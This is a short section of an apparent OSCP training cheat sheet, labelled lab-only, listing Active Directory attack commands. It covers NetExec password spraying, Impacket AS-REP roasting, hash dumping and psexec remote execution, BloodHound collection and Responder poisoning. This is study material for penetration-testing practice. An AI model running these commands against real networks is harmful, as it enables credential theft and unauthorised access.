## 11. Active Directory / Internal Network (OSCP track — lab only)

### CrackMapExec / NetExec
```bash
netexec smb 192.168.x.x -u users.txt -p passwords.txt
netexec smb 192.168.x.x -u admin -p 'password' --shares
```

### Impacket suite
```bash
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass    # AS-REP roasting
impacket-secretsdump domain/user:pass@192.168.x.x                    # dump hashes
impacket-psexec domain/user:pass@192.168.x.x                         # remote exec
```

### BloodHound (AD attack path mapping)
```bash
bloodhound-python -u user -p pass -d domain.local -c all
```

### Responder (LLMNR/NBT-NS poisoning — lab only)
```bash
responder -I eth0 -wrf
```

